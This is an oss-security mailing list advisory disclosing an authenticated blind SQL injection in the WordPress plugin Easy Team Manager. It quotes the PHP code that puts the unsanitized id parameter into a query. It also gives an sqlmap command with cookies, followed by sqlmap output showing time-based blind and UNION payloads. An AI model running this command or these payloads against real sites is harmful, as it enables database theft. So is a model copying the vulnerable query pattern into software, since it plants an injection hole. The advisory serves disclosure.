  oss-security - Blind SQL Injection in Wordpress Plugin Easy Team Manager            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [day] [month] [year] [list]  Date: Tue, 30 May From: "Larry W. Cashdollar" <larry0@...com> To: Open Source Security <oss-security@...ts.openwall.com> Subject: Blind SQL Injection in Wordpress Plugin Easy Team Manager  Title: Blind SQL Injection in Wordpress Plugin Easy Team Manager Author: Larry W. Cashdollar, @_larry0 Date: Download Site: https://wordpress.org/plugins/easy-team-manager/ Vendor: https://daisythemes.com/ Vendor Notified: Vendor Contact: web form contact Advisory: Description: Easy Team Manager helps you to create team members with their short descriptions, social profiles link with smooth hover effects. Vulnerability: The following code does not sanitize $_GET['id'] before making it part of an SQL statement in file ./easy-team-manager/inc/easy_team_manager_desc_edit.php:  85-        global $wpdb;	 86-        $easy_team_manager_desc = $wpdb->get_results("SELECT *from ".$wpdb->prefix."easy_team_manager_description where id=".$_GET['id']); 87-		foreach ($easy_team_manager_desc as $s ){ 88-			$ind_name_detail = unserialize($s->name); 89-			$socia_media = unserialize($s->social_media); 90:			$id=$_GET['id']; 91-			$ind_position = esc_attr($s->position); 92-			$ind_image=$s->image; 93-			$ind_email_detail = unserialize($s->email); 94-			$ind_phone_detail = unserialize($s->phone); 95-			$ind_desc = esc_attr(stripcslashes($s->ind_description));  This allows blind SQL injection via the id parameter by an authenticated user with edit team priveledges.   Exploit Code: 	• $ sqlmap -u 'http://example.com/wordpress/wp-admin/admin.php?page=easy_team_manager_edit&id=*' --load-cookies=./cookies.txt --level=4 --risk=3 --dbms=mysql 	•   	• [INFO] URI parameter '#1*' is 'MySQL UNION query (84) - 1 to 20 columns' injectable 	• URI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N]  	• sqlmap identified the following injection point(s) with a total of HTTP(s) requests: 	• --- 	• Parameter: #1* (URI) 	•     Type: AND/OR time-based blind 	•     Title: MySQL >= time-based blind - Parameter replace 	•     Payload: http://example.com:80/wordpress/wp-admin/admin.php?page=easy_team_manager_edit&id=(CASE WHEN THEN SLEEP(5) ELSE END) 	•     Type: UNION query 	•     Title: MySQL UNION query (84) - 5 columns 	•     Payload: UNION ALL SELECT 	• --- 	• [INFO] the back-end DBMS is MySQL 	• web server operating system: Linux Ubuntu (xenial) 	• web application technology 	• : Apache 	• back-end DBMS: MySQL >= 	• [INFO] fetched data logged to text files under '/home/larry/.sqlmap/output/example.com' 	•   	• [*] shutting down at Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      